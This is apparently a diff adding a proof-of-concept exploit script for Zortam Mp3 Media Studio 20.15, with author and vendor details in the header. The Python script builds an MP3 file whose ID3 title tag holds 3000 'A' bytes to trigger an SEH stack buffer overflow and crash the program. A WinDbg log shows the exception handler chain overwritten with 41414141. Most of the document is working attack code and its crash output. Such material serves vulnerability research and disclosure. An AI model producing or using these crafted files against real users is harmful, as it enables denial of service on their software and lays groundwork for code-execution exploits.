@@ -1,0 +1,109 @@
+#-*- coding: utf-8 -*-
+
+#
+
+# Exploit Title : Zortam Mp3 Media Studio 20.15 - SEH overflow DOS
+
+# Date: 2016-03-12
+
+# Author: INSECT.B
+
+#   Facebook : https://www.facebook.com/B.INSECT00
+
+#   GitHub : binsect00
+
+#   Blog : http://binsect00.tistory.com
+
+# Vendor Homepage : http://www.zortam.com
+
+# Software Link: http://www.zortam.com/download.html
+
+# Version: 20.15
+
+# Tested on: Windows7 Professional SP1 En x86 
+
+# CVE : N/A
+
+#
+
+# Detail..
+
+#  1. Zortam Mp3 Media Studio is program that change tags sound file
+
+#  2. If tag length over certain length, program is occured crash.  
+
+#  3. Make mp3 file. title tag length is 3000.
+
+#  4. program open. and serching Directory
+
+
+
+
+
+id3Id = '\x49\x44\x33' #ID3
+
+id3Version = '\x03\x00'
+
+id3Flag = '\x00'
+
+id3Size = '\x00\x00\x2F\x2D'
+
+id3 = id3Id + id3Version + id3Flag + id3Size
+
+
+
+frameId = '\x54\x49\x54\x32' #TIT2
+
+frameSize = '\x00\x00\x0B\xB9' #Frame Size
+
+frameFlag = '\x00\x00'
+
+textEncoding = '\x00'
+
+textInfo = 'A'*3000
+
+frame = frameId + frameSize + frameFlag + textEncoding + textInfo
+
+
+
+
+
+padding = '\x00'*1100
+
+
+
+payload = id3 + frame + padding
+
+with open('Zortam Mp3 Media Studio 20.15 DOS Vulnerabilities.mp3','wb') as f:
+
+	f.write(payload)
+
+
+
+'''
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+
+(aa4.c08): Break instruction exception - code 80000003 (first chance)
+
+eax=00000000 ebx=743b74ec ecx=7619e28c edx=0012e4a9 esi=00000000 edi=756d6640
+
+eip=7619e109 esp=0012e6f0 ebp=0012e76c iopl=0         nv up ei pl zr na pe nc
+
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
+
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\kernel32.dll - 
+
+kernel32!FormatMessageA+0x14031:
+
+7619e109 cc              int     3
+
+0:000> !exchain
+
+0012e75c: kernel32!RegSaveKeyExA+3e9 (761ca022)
+
+0012f2b8: 41414141
+
+Invalid exception stack at 41414141
+
+'''
